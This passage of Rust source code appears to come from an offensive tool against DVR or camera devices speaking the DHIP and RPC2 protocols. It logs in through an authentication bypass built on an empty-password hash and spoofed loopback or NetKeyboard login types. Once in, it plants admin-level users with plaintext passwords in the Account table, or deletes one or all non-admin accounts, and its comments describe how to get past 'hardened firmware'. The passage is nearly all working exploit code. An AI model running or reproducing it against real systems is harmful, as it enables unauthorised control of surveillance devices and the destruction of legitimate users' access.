    let dhip = &ctx.dhip;
    let session_id = ctx.session_id;
    let realm_id = chal.realm_id;

    let timeout = Duration::from_secs(5);
    let mut result = Err("DHIP deleteUser failed".into());

    let mut name = user_name.clone();
    let (users, listed) =
        dhip_list_all_users(sock, pcp_session, &dhip, session_id, timeout, args.verbose).await;
    if let Some(obj) = users.iter().find(|u| {
        if let Some(n) = &name {
            u.get("Name").and_then(|x| x.as_str()).unwrap_or("") == n
        } else {
            u.get("Id").and_then(|x| x.as_u64()).unwrap_or(0) as u32 == user_id.unwrap_or(0)
        }
    }) {
        name = obj
            .get("Name")
            .and_then(|n| n.as_str())
            .map(|s| s.to_string());
    }
    let found_in_list = listed
        && users.iter().any(|u| {
            if let Some(n) = &name {
                u.get("Name").and_then(|x| x.as_str()).unwrap_or("") == n
            } else {
                u.get("Id").and_then(|x| x.as_u64()).unwrap_or(0) as u32 == user_id.unwrap_or(0)
            }
        });
    let user_id = user_id.unwrap_or(0);
    if args.verbose {
        eprintln!(
            "[debug] DHIP delete resolved name: {:?} (listed={})",
            name, listed
        );
    }
    if !listed && user_name.is_none() {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("getUserInfoAll: no/invalid response — device never listed users".into());
    }
    // Fail-fast: la lista è stata letta con successo ma l'utente NON compare (es.
    // `6B003ACPAZ64EDE` ha decine di utenti ma manca l'Id richiesto) — inutile provare
    // le varianti deleteUser: con nome nullo il device risponde 268894211 per tutte.
    if listed && !found_in_list {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err(if user_name.is_some() {
            format!(
                "user '{}' not found on device (user list queried ok) — aborting delete",
                user_name.unwrap_or_default()
            )
        } else {
            format!(
                "user Id={} not found on device (user list queried ok) — aborting delete",
                user_id
            )
        });
    }

    let variant_shapes: Vec<Value> = vec![
        json!({"name": name.as_deref().unwrap_or("")}),
        json!({"user": {"Id": user_id, "Name": name.as_deref().unwrap_or("")}}),
        json!({"user": {"Id": user_id}}),
        json!({"user": {"Name": name.as_deref().unwrap_or("")}}),
        json!({"user": {"Id": user_id, "Name": name.as_deref().unwrap_or("")}, "id": user_id}),
        json!({"Id": user_id, "Name": name.as_deref().unwrap_or("")}),
    ];
    for params in variant_shapes {
        let req = json!({"id": 100, "magic": "0x1234", "method": "userManager.deleteUser",
            "params": params, "session": session_id});
        if args.verbose {
            eprintln!("[debug] DHIP deleteUser: {}", req);
        }
        if let Some(t) = dhip_call(sock, pcp_session, &dhip, &req.to_string(), timeout).await {
            match serde_json::from_str::<Value>(&t) {
                Ok(v) => {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        println!(
                            "  [+] user Id={} ({}) deleted via DHIP",
                            user_id,
                            name.as_deref().unwrap_or("?")
                        );
                        result = Ok(());
                        break;
                    }
                    if args.verbose {
                        eprintln!("[debug] DHIP deleteUser failed: {}", t);
                    }
                }
                Err(_) => {
                    if args.verbose {
                        eprintln!("[debug] DHIP deleteUser: non-JSON response: {}", t);
                    }
                }
            }
        } else if args.verbose {
            eprintln!("[debug] DHIP deleteUser: no response (channel likely dead)");
        }
    }

    let _ = dhip_call(sock, pcp_session, &dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// Delete ALL users except the admin (Id 2 / name "admin") over the DHIP session.
/// Lists users via getUserInfoAll, then deletes each non-admin user by name.
async fn dhip_try_delete_all(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    chal: &DhipChallengeInfo,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), String> {
    let ctx = match dhip_established_session(sock, pcp_session, chal, args, probe_timeout).await {
        Ok(c) => c,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
            return Err(e);
        }
    };
    let dhip = &ctx.dhip;
    let session_id = ctx.session_id;
    let realm_id = chal.realm_id;

    let timeout = Duration::from_secs(5);

    // List all users (full fallback chain: getUserInfoAll, getUserList, getConfig Account).
    let (users, listed) =
        dhip_list_all_users(sock, pcp_session, &dhip, session_id, timeout, args.verbose).await;
    if !listed {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("getUserInfoAll: no/invalid response — device never listed users".into());
    }

    // Collect targets: everything except admin (Id==2 or name=="admin", case-insensitive).
    let admin_id = 2u32;
    let targets: Vec<(u32, String)> = users
        .iter()
        .filter_map(|u| {
            let id = u
                .get("Id")
                .and_then(|x| x.as_u64())
                .map(|v| v as u32)
                .unwrap_or(0);
            let nm = u
                .get("Name")
                .and_then(|x| x.as_str())
                .unwrap_or("")
                .to_string();
            let is_admin = id == admin_id || nm.eq_ignore_ascii_case("admin");
            if is_admin {
                None
            } else {
                Some((id, nm))
            }
        })
        .collect();

    if targets.is_empty() {
        println!("  [!] no non-admin users found on device — nothing to delete");
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Ok(());
    }
    println!("  [*] deleting {} user(s) (keeping admin)", targets.len());

    let mut deleted = 0usize;
    let mut failed = 0usize;
    for (id, nm) in &targets {
        let variant_shapes: Vec<Value> = vec![
            json!({"name": nm}),
            json!({"user": {"Id": id, "Name": nm}}),
            json!({"user": {"Id": id}}),
            json!({"user": {"Name": nm}}),
            json!({"user": {"Id": id, "Name": nm}, "id": id}),
            json!({"Id": id, "Name": nm}),
        ];
        let mut ok_this = false;
        for params in variant_shapes {
            let req = json!({"id": 100, "magic": "0x1234", "method": "userManager.deleteUser",
                "params": params, "session": session_id});
            if args.verbose {
                eprintln!("[debug] DHIP deleteUser: {}", req);
            }
            if let Some(t) = dhip_call(sock, pcp_session, &dhip, &req.to_string(), timeout).await {
                if let Ok(v) = serde_json::from_str::<Value>(&t) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        ok_this = true;
                        break;
                    }
                }
            } else if last_call_disc() {
                break;
            }
        }
        if ok_this {
            println!("  [+] user Id={} ({}) deleted via DHIP", id, nm);
            deleted += 1;
        } else {
            eprintln!("  [-] user Id={} ({}) delete failed", id, nm);
            failed += 1;
        }
        if last_call_disc() {
            eprintln!(
                "  [!] device sent DISC — stopping early ({} deleted, {} failed)",
                deleted, failed
            );
            break;
        }
    }

    let _ = dhip_call(sock, pcp_session, &dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;

    if failed > 0 {
        Err(format!(
            "delete-all: {} deleted, {} failed",
            deleted, failed
        ))
    } else {
        println!("  [+] all {} non-admin user(s) deleted", deleted);
        Ok(())
    }
}

/// DHIP addUser + configManager.setConfig (Account table with plaintext password).
async fn dhip_add_user_with_account(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    session_id: u32,
    pw_hash: &str,
    args: &Args,
) -> Result<(), String> {
    let timeout = Duration::from_secs(10);

    // Query device's supported authority list
    let authority_list =
        dhip_get_authority_list(sock, pcp_session, dhip, session_id, timeout).await;

    let group = if args.group == "user" {
        "user"
    } else {
        "admin"
    };
    let authority_list: Vec<String> = if group == "user" {
        authority_list
            .into_iter()
            .filter(|a| a.starts_with("Monitor") || a.starts_with("Replay"))
            .collect()
    } else {
        authority_list
    };
    let types: &[&str] = if group == "user" {
        &["Normal"]
    } else {
        &["Admin", "Operator", "Normal"]
    };

    let mut all_same_code = true;
    let mut first_code: i64 = 0;
    let mut last_err = String::new();
    let mut answered = 0usize;

    for utype in types {
        let al = authority_list.clone();
        let user_obj = json!({
            "Name": &args.user, "Password": pw_hash,
            "Group": group, "Memo": &args.memo, "Type": utype,
            "passwordType": "Default",
            "AuthorityList": al,
        });
        let req = json!({"id": 100, "magic": "0x1234", "method": "userManager.addUser",
            "params": {"user": user_obj}, "session": session_id});
        if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
            answered += 1;
            if args.verbose {
                eprintln!("[debug] DHIP addUser(Type={}) response: {}", utype, t);
            }
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                    println!("  [+] user added via DHIP (Type={})", utype);
                    let set_params = json!({"name": "Account", "table": {"User": [{
                        "Name": &args.user, "Password": &args.password,
                        "Group": group, "Memo": &args.memo, "Type": utype,
                        "passwordType": "Default",
                        "AuthorityList": authority_list,
                    }]}});
                    let set_req = json!({"id": 220, "magic": "0x1234", "method": "configManager.setConfig",
                        "params": set_params, "session": session_id});
                    if let Some(t) =
                        dhip_call(sock, pcp_session, dhip, &set_req.to_string(), timeout).await
                    {
                        if t.contains("result\":true") {
                            println!("  [+] Account table updated with plaintext password");
                        }
                    }
                    return Ok(());
                }
                let err_str = v
                    .get("error")
                    .and_then(|e| e.get("message"))
                    .and_then(|m| m.as_str())
                    .unwrap_or("");
                if err_str.to_lowercase().contains("exist") || t.to_lowercase().contains("exist") {
                    println!(
                        "  [!] user '{}' already exists on device, skipping",
                        &args.user
                    );
                    return Ok(());
                }
                let code = v
                    .get("error")
                    .and_then(|e| e.get("code"))
                    .and_then(|c| c.as_i64())
                    .unwrap_or(0);
                let msg = v
                    .get("error")
                    .and_then(|e| e.get("message"))
                    .and_then(|m| m.as_str())
                    .unwrap_or("");
                if !last_err.is_empty() {
                    last_err.push_str("; ");
                }
                last_err.push_str(&format!("Type={} code={} '{}'", utype, code, msg));
                if *utype == "Admin" {
                    first_code = code;
                } else if code != first_code {
                    all_same_code = false;
                }
            }
        }
    }

    if args.verbose {
        eprintln!(
            "[debug] DHIP addUser all_same_code={} first_code={}",
            all_same_code, first_code
        );
    }

    // Extra variant: MINIMAL user object — some firmwares choke (silently drop
    // the channel) on unexpected fields like CtrPanel/ShutDown authorities and
    // answer to a bare Name/Password/Group/Type request instead.
    if answered == 0 {
        for utype in ["Admin", "Normal"] {
            let user_obj = json!({
                "Name": &args.user, "Password": pw_hash,
                "Group": group, "Type": utype,
                "passwordType": "Default",
                "AuthorityList": ["Monitor"],
            });
            let req = json!({"id": 100, "magic": "0x1234", "method": "userManager.addUser",
                "params": {"user": user_obj}, "session": session_id});
            if args.verbose {
                eprintln!("[debug] DHIP addUser(minimal Type={}) request", utype);
            }
            if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
                answered += 1;
                if args.verbose {
                    eprintln!(
                        "[debug] DHIP addUser(minimal Type={}) response: {}",
                        utype, t
                    );
                }
                if t.contains("result\":true") {
                    println!(
                        "  [+] user added via DHIP (minimal payload, Type={})",
                        utype
                    );
                    return Ok(());
                }
                if !last_err.is_empty() {
                    last_err.push_str("; ");
                }
                last_err.push_str(&format!(
                    "minimal Type={} → {}",
                    utype,
                    t.replace('\n', " ")
                ));
            }
        }
    }

    // Last resort: write the Account table directly. On some firmwares
    // configManager.setConfig is allowed where userManager.addUser is blocked.
    {
        let set_params = json!({"name": "Account", "table": {"User": [{
            "Name": &args.user, "Password": &args.password,
            "Group": group, "Memo": &args.memo, "Type": "Normal",
            "passwordType": "Default",
            "AuthorityList": authority_list,
        }]}});
        let set_req = json!({"id": 220, "magic": "0x1234", "method": "configManager.setConfig",
            "params": set_params, "session": session_id});
        if args.verbose {
            eprintln!("[debug] DHIP setConfig(Account) fallback");
        }
        if let Some(t) = dhip_call(sock, pcp_session, dhip, &set_req.to_string(), timeout).await {
            // IMPORTANT: `result:true` here does NOT guarantee the user was added.
            // Some devices (e.g. full account table / max-user limit) accept the
            // setConfig but silently ignore the new user. Always confirm the user
            // really exists via getUserInfoAll before declaring OK.
            if t.contains("result\":true") {
                if dhip_user_exists(sock, pcp_session, dhip, session_id, &args.user, timeout).await
                {
                    if args.verbose {
                        eprintln!("[debug] confirmed via getUserInfoAll");
                    }
                    println!(
                        "  [+] user written via configManager.setConfig (Account table, confirmed)"
                    );
                } else {
                    if args.verbose {
                        eprintln!(
                            "[debug] setConfig returned true but user NOT found via getUserInfoAll"
                        );
                    }
                    println!("  [!] setConfig accepted the write but the user is NOT in the account table");
                    println!(
                        "  [!] a likely cause is that the device reached its maximum number of users \
                         (addUser failed with code 615). Delete an existing user and retry."
                    );
                    return Err(
                        "addUser failed: device did not add user (max users reached, code 615?)"
                            .to_string(),
                    );
                }
                return Ok(());
            }
            let code = serde_json::from_str::<Value>(&t).ok().and_then(|v| {
                v.get("error")
                    .and_then(|e| e.get("code"))
                    .and_then(|c| c.as_i64())
            });
            if code == Some(615) {
                println!("  [!] device reports max user limit reached (code 615)");
                return Err("addUser failed: maximal number of users reached on device".to_string());
            }
            if args.verbose {
                eprintln!("[debug] DHIP setConfig(Account) response: {}", t);
            }
        } else if args.verbose {
            eprintln!("[debug] DHIP setConfig(Account): no response");
        }
    }

    // Do NOT guess "already exists" from the error code alone: on some devices a
    // brand-new user also fails with the same error (e.g. 268632079). Confirm the
    // user is really present via getUserInfoAll before declaring it a duplicate.
    if dhip_user_exists(sock, pcp_session, dhip, session_id, &args.user, timeout).await {
        println!(
            "  [!] user '{}' already exists on device, skipping",
            &args.user
        );
        return Ok(());
    }

    // Hardened firmware signature #1: the bypass session can read but account
    // management is rejected with "Component error: login challenge!".
    if last_err.contains("268632079") || last_err.to_lowercase().contains("login challenge") {
        return Err(format!(
            "all DHIP addUser variants failed [{}] — hardened firmware: add requires a real authenticated session, retry with --admin-pass or --try-defaults",
            last_err
        ));
    }
    // Hardened firmware signature #2: the device goes SILENT on addUser from a
    // bypass session (drops the channel instead of answering, e.g. 2L05BD6PAZ00030).
    if answered == 0 && last_err.is_empty() {
        let hint = if args.admin_pass.is_empty() {
            "device never answered any addUser — hardened firmware likely drops bypass sessions; retry with -p <admin password> or --try-defaults"
        } else {
            "device never answered any addUser even with admin credentials — check credentials or device state"
        };
        return Err(format!("all DHIP addUser variants failed: {}", hint));
    }
    Err(format!("all DHIP addUser variants failed [{}]", last_err))
}

/// Query userManager.getUserInfoAll via DHIP and check whether a user name exists.
async fn dhip_user_exists(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    session_id: u32,
    name: &str,
    timeout: Duration,
) -> bool {
    let req = json!({"id": 100, "magic": "0x1234", "method": "userManager.getUserInfoAll",
        "params": {}, "session": session_id});
    if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
        if let Ok(v) = serde_json::from_str::<Value>(&t) {
            if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                if let Some(arr) = v
                    .get("params")
                    .and_then(|p| p.get("users"))
                    .and_then(|u| u.as_array())
                {
                    return arr
                        .iter()
                        .any(|u| u.get("Name").and_then(|n| n.as_str()) == Some(name));
                }
            }
        }
    }
    false
}

/// DHIP getAuthorityList — queried from device, with Smart Manager fallback.
async fn dhip_get_authority_list(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    session_id: u32,
    timeout: Duration,
) -> Vec<String> {
    let req = json!({"id": 101, "magic": "0x1234", "method": "userManager.getAuthorityList",
        "params": {}, "session": session_id});
    if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
        if let Ok(v) = serde_json::from_str::<Value>(&t) {
            if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                if let Some(params) = v.get("params").and_then(|p| p.as_array()) {
                    let list: Vec<String> = params
                        .iter()
                        .filter_map(|s| s.as_str().map(String::from))
                        .collect();
                    if !list.is_empty() {
                        return list;
                    }
                }
            }
        }
    }
    // Fallback: Smart Manager authority list from sniff log analysis
    vec![
        "Monitor".into(),
        "Monitor_01".into(),
        "Monitor_02".into(),
        "Monitor_03".into(),
        "Monitor_04".into(),
        "Replay".into(),
        "Replay_01".into(),
        "Replay_02".into(),
        "Replay_03".into(),
        "Replay_04".into(),
        "AuthUserMag".into(),
        "AuthSysCfg".into(),
        "AuthSysInfo".into(),
        "AuthManuCtr".into(),
        "AuthStoreCfg".into(),
        "AuthEventCfg".into(),
        "AuthNetCfg".into(),
        "AuthRmtDevice".into(),
        "AuthSecurity".into(),
        "AuthBackup".into(),
        "AuthMaintence".into(),
    ]
}

/// Perform DHIP challenge and return the realm info plus the live channel.
/// Tries port 5000 first, then port 80 for devices that only expose DHIP on HTTP port.
async fn dhp_challenge(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    args: &Args,
    probe_timeout: Duration,
) -> Option<DhipChallengeInfo> {
    for &port in &[5000u16, 80, 37777] {
        if let Some(result) =
            dhp_challenge_on_port(sock, pcp_session, args, probe_timeout, port).await
        {
            return Some(result);
        }
    }
    None
}

async fn dhp_challenge_on_port(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    args: &Args,
    probe_timeout: Duration,
    port: u16,
) -> Option<DhipChallengeInfo> {
    let bind_timeout = Duration::from_secs(15);
    let realm_id = match ptcp_bind(sock, pcp_session, port, bind_timeout).await {
        Some(r) => r,
        None => {
            if args.verbose {
                eprintln!("[debug] dhp_challenge: ptcp_bind on {} failed", port);
            }
            return None;
        }
    };

    let dhip = Arc::new(Mutex::new(DhipSession::new(realm_id)));

    let login1 = json!({
        "id": 1, "magic": "0x1234", "method": "global.login",
        "params": {
            "clientType": "Web3.0",
            "ipAddr": "127.0.0.1", "loginType": "Direct",
            "password": "", "userName": &args.admin_user,
        },
        "session": 0,
    });

    let resp1 = match dhip_call(sock, pcp_session, &dhip, &login1.to_string(), probe_timeout).await
    {
        Some(r) => r,
        None => {
            if args.verbose {
                eprintln!("[debug] dhp_challenge: dhip_call (global.login) on port {} timed out or no reply", port);
            }
            ptcp_disconnect(sock, pcp_session, realm_id).await;
            return None;
        }
    };
    let val1: Value = match serde_json::from_str(&resp1) {
        Ok(v) => v,
        Err(e) => {
            if args.verbose {
                eprintln!(
                    "[debug] dhp_challenge: bad JSON on port {}: {} raw={:?}",
                    port, e, resp1
                );
            }
            ptcp_disconnect(sock, pcp_session, realm_id).await;
            return None;
        }
    };
    if args.verbose {
        eprintln!(
            "[debug] dhp_challenge: login reply on port {}: {}",
            port, resp1
        );
    }
    let realm = match val1
        .get("params")
        .and_then(|p| p.get("realm"))
        .and_then(|v| v.as_str())
    {
        Some(r) => r.to_string(),
        None => {
            if args.verbose {
                eprintln!("[debug] dhp_challenge: no realm in reply on port {}", port);
            }
            ptcp_disconnect(sock, pcp_session, realm_id).await;
            return None;
        }
    };
    let random = val1
        .get("params")
        .and_then(|p| p.get("random"))
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let session_id = val1.get("session").and_then(|v| v.as_u64()).unwrap_or(0) as u32;

    Some(DhipChallengeInfo {
        realm_id,
        port,
        realm,
        random,
        session_id,
    })
}

// ---- HTTP/RPC2 Flow (uses DHIP numeric realm for the password hash) ----

async fn http_try_add_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dh_realm: &str,
    port: u16,
    args: &Args,
    _probe_timeout: Duration,
) -> Result<(), String> {
    if args.verbose {
        eprintln!("[debug] HTTP addUser using port {}", port);
    }
    let bind_timeout = Duration::from_secs(15);
    let realm_id = ptcp_bind(sock, pcp_session, port, bind_timeout)
        .await
        .ok_or_else(|| format!("PTCP bind failed on port {}", port))?;

    let host = format!("127.0.0.1:{}", port);
    let timeout = Duration::from_secs(10);

    // Step 1: HTTP login challenge
    let login1 = json!({
        "method": "global.login",
        "params": {
            "userName": &args.admin_user,
            "password": "",
            "clientType": "Web3.0",
            "loginType": "Direct",
        },
        "id": 10000,
    });

    let resp1 = http_call(
        sock,
        pcp_session,
        realm_id,
        &host,
        "/RPC2_Login",
        &login1.to_string(),
        timeout,
        "",
    )
    .await
    .ok_or("HTTP login challenge timeout")?;

    let resp1_body = http_extract_body(&resp1).ok_or("No body in HTTP challenge response")?;

    let val1: Value = serde_json::from_str(resp1_body)
        .map_err(|e| format!("bad JSON in HTTP challenge: {}", e))?;

    if val1
        .get("result")
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
    {
        let session = val1
            .get("session")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let result =
            http_add_user(sock, pcp_session, realm_id, &host, &session, dh_realm, args).await;
        let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return result;
    }

    let session = val1
        .get("session")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let http_realm = val1
        .get("params")
        .and_then(|p| p.get("realm"))
        .and_then(|v| v.as_str())
        .unwrap_or("");

    if session.is_empty() {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("no session in HTTP challenge".into());
    }

    // Use http_realm for the bypass hash, but dh_realm for the addUser password hash
    if args.verbose {
        eprintln!("[debug] HTTP login realm: {:?}", http_realm);
        eprintln!("[debug] Using DHIP realm for addUser hash: {:?}", dh_realm);
    }

    // Step 2: HTTP bypass login (same empty_password_hash as DHIP)
    let http_random = val1
        .get("params")
        .and_then(|p| p.get("random"))
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let hash = empty_password_hash(&args.admin_user, http_realm, http_random);
    let bypasses = [
        ("Loopback", "Local", "Admin"),
        ("Direct", "NetKeyboard", "Admin"),
        ("Loopback", "Local", "Default"),
        ("Direct", "NetKeyboard", "Default"),
    ];

    let mut login_ok = false;

    if !args.admin_pass.is_empty() {
        let pw_hash = password_hash(&args.admin_user, http_realm, http_random, &args.admin_pass);
        let login2 = json!({
            "method": "global.login",
            "session": &session,
            "params": {
                "userName": &args.admin_user,
                "password": pw_hash,
                "ipAddr": "127.0.0.1",
                "loginType": "Loopback",
                "clientType": "Local",
                "authorityType": "Default",
                "passwordType": "Default",
            },
            "id": 10001,
        });
        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            &host,
            "/RPC2_Login",
            &login2.to_string(),
            timeout,
            &session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if args.verbose {
                            eprintln!("[debug] HTTP login via password");
                        }
                        login_ok = true;
                    }
                }
            }
        }
    }

    if !login_ok {
        for (login_type, client_type, authority) in &bypasses {
            let login2 = json!({
                "method": "global.login",
                "session": &session,
                "params": {
                    "userName": &args.admin_user,
                    "password": hash,
                    "ipAddr": "127.0.0.1",
                    "loginType": login_type,
                    "clientType": client_type,
                    "authorityType": authority,
                    "passwordType": "Default",
                },
                "id": 10001,
            });
            if let Some(t) = http_call(
                sock,
                pcp_session,
                realm_id,
                &host,
                "/RPC2_Login",
                &login2.to_string(),
                timeout,
                &session,
            )
            .await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            if args.verbose {
                                eprintln!(
                                    "[debug] HTTP login via {}/{} ({})",
                                    client_type, login_type, authority
                                );
                            }
                            login_ok = true;
                            break;
                        }
                    }
                }
            }
        }
    }

    if !login_ok {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("HTTP bypass login failed".into());
    }

    let result = http_add_user(sock, pcp_session, realm_id, &host, &session, dh_realm, args).await;
    let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// HTTP addUser using the given realm (should be DHIP numeric realm).
async fn http_add_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    realm: &str,
    args: &Args,
) -> Result<(), String> {
    let timeout = Duration::from_secs(10);
    let pw_hash = http_adduser_password_hash(&args.user, realm, &args.password);

    if args.verbose {
        eprintln!(
            "[debug] HTTP addUser hash: MD5({}:{}:{}) = {}",
            &args.user, realm, &args.password, pw_hash
        );
    }

    // Get device's supported authority list (like Smart Manager does)
    let authority_list =
        http_get_authority_list(sock, pcp_session, realm_id, host, session, timeout).await;

    let group = if args.group == "user" {
        "user"
    } else {
        "admin"
    };
    let authority_list: Vec<String> = if group == "user" {
        authority_list
            .into_iter()
            .filter(|a| a.starts_with("Monitor") || a.starts_with("Replay"))
            .collect()
    } else {
        authority_list
    };
    let types: &[&str] = if group == "user" {
        &["Normal"]
    } else {
        &["Normal", "Admin", "Operator"]
    };

    let mut last_err = String::new();

    for utype in types {
        let params = json!({"user": {
            "Name": &args.user,
            "Password": pw_hash,
            "Group": group,
            "Sharable": true,
            "Reserved": false,
            "Memo": &args.memo,
            "Type": utype,
            "passwordType": "Default",
            "MaxMonitorChannels": -1,
            "MacOnly": "",
            "AuthorityList": authority_list,
        }});

        let body = json!({
            "method": "userManager.addUser",
            "session": session,
            "params": params,
            "id": 101,
        });

        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            host,
            "/RPC2",
            &body.to_string(),
            timeout,
            session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        println!("  [+] user added via HTTP/RPC2 (Type={})", utype);
                        return Ok(());
                    }
                    let err_str = v
                        .get("error")
                        .and_then(|e| e.get("message"))
                        .and_then(|m| m.as_str())
                        .unwrap_or("");
                    let code = v
                        .get("error")
                        .and_then(|e| e.get("code"))
                        .and_then(|c| c.as_i64())
                        .unwrap_or(0);
                    if !last_err.is_empty() {
                        last_err.push_str("; ");
                    }
                    last_err.push_str(&format!("Type={} code={} '{}'", utype, code, err_str));
                    if err_str.to_lowercase().contains("exist")
                        || b.to_lowercase().contains("exist")
                    {
                        println!(
                            "  [!] user '{}' already exists on device, skipping",
                            &args.user
                        );
                        return Ok(());
                    }
                    eprintln!("[debug] HTTP addUser(Type={}) failed: {}", utype, b);
                }
            }
        } else if last_call_disc() {
            if args.verbose {
                eprintln!("[debug] HTTP addUser: device sent DISC — channel dead");
            }
            return Err("device disconnected during addUser".into());
        }
    }

    // Do NOT guess "already exists" from the error code alone (false positives on
    // some devices). Confirm the user is really present via getUserInfoAll first.
    if http_user_exists(
        sock,
        pcp_session,
        realm_id,
        host,
        session,
        &args.user,
        timeout,
    )
    .await
    {
        println!(
            "  [!] user '{}' already exists on device, skipping",
            &args.user
        );
        return Ok(());
    }

    if last_err.contains("268632079") || last_err.to_lowercase().contains("login challenge") {
        return Err(format!(
            "all HTTP addUser variants failed [{}] — hardened firmware: add requires a real authenticated session, retry with --admin-pass",
            last_err
        ));
    }
    Err(format!("all HTTP addUser variants failed [{}]", last_err))
}

/// Query userManager.getUserInfoAll via HTTP and check whether a user name exists.
async fn http_user_exists(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    name: &str,
    timeout: Duration,
) -> bool {
    let body = json!({"method": "userManager.getUserInfoAll", "session": session, "params": {}, "id": 102});
    if let Some(t) = http_call(
        sock,
        pcp_session,
        realm_id,
        host,
        "/RPC2",
        &body.to_string(),
        timeout,
        session,
    )
    .await
    {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                    if let Some(arr) = v
                        .get("params")
                        .and_then(|p| p.get("users"))
                        .and_then(|u| u.as_array())
                    {
                        return arr
                            .iter()
                            .any(|u| u.get("Name").and_then(|n| n.as_str()) == Some(name));
                    }
                }
            }
        }
    }
    false
}

/// Query device for supported authority list via userManager.getAuthorityList.
/// Falls back to a hardcoded list (from Smart Manager sniff log) on failure.
async fn http_get_authority_list(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    timeout: Duration,
) -> Vec<String> {
    let body = json!({
        "method": "userManager.getAuthorityList",
        "session": session,
        "params": {},
        "id": 100,
    });

    if let Some(t) = http_call(
        sock,
        pcp_session,
        realm_id,
        host,
        "/RPC2",
        &body.to_string(),
        timeout,
        session,
    )
    .await
    {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                    if let Some(params) = v.get("params").and_then(|p| p.as_array()) {
                        let list: Vec<String> = params
                            .iter()
                            .filter_map(|s| s.as_str().map(String::from))
                            .collect();
                        if !list.is_empty() {
                            return list;
                        }
                    }
                }
            }
        }
    }

    // Fallback: Smart Manager authority list from sniff log analysis
    vec![
        "Monitor".into(),
        "Monitor_01".into(),
        "Monitor_02".into(),
        "Monitor_03".into(),
        "Monitor_04".into(),
        "Replay".into(),
        "Replay_01".into(),
        "Replay_02".into(),
        "Replay_03".into(),
        "Replay_04".into(),
        "AuthUserMag".into(),
        "AuthSysCfg".into(),
        "AuthSysInfo".into(),
        "AuthManuCtr".into(),
        "AuthStoreCfg".into(),
        "AuthEventCfg".into(),
        "AuthNetCfg".into(),
        "AuthRmtDevice".into(),
        "AuthSecurity".into(),
        "AuthBackup".into(),
        "AuthMaintence".into(),
    ]
}

async fn http_logout(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    timeout: Duration,
) {
    let body = json!({
        "method": "global.logout",
        "session": session,
        "params": "null",
        "id": 99,
    });
    let _ = http_call(
        sock,
        pcp_session,
        realm_id,
        host,
        "/RPC2",
        &body.to_string(),
        timeout,
        session,
    )
    .await;
}

/// Delete the user with the given numeric Id on each device.
async fn delete_users(
    serials: &[String],
    user_id: Option<u32>,
    user_name: Option<String>,
    args: &Args,
